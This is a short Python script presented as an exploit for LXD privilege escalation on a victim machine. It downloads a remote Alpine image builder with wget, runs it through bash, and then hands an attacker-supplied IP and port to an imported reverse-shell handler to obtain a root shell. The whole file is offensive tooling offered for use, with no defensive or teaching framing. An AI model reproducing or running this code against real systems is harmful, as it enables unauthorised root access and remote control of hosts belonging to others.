import os, time, re
import sys
import rev_shell_handler
# This Exploit uses a vulnerability in the LXD software in order to spawn a root shell

# The exploit requires action in both the attacking and victim machine

def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		# if match is found
		if match:
			return file
	return None

def main():
	if len(sys.argv) != 5:
		exit('Wrong number of arguments, pass ip and port')
	print('''
	##################################################################################
	#										 #
	# 			    LXD PRIVILEGE ESCALATION 				 #		
	#										 #
	##################################################################################
	''')
	print('[*] Getting Alpine Builder')
	if not ( os.path.exists('./build-alpine')):
		cmd = '''
		wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
		bash build-alpine
		'''
		os.system(cmd)
		time.sleep(0.2)
		if not os.path.exists('./build-alpine'):
			sys.exit('Something went wrong, build-alpine not detected')
	elif get_file_name() == None:
		print('[*] We detected that you already have an build-alpine file but not the alpine.tar.gz')
		cmd = '''bash build-alpine'''
		os.system(cmd)
	else:
		pass
	
	print('[*] Opening Reverse Shell on: {ip}:{port}'.format(ip=sys.argv[1], port=sys.argv[2]))
	rev_shell_handler.listen_shell(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
	

if __name__ == '__main__':
	main()
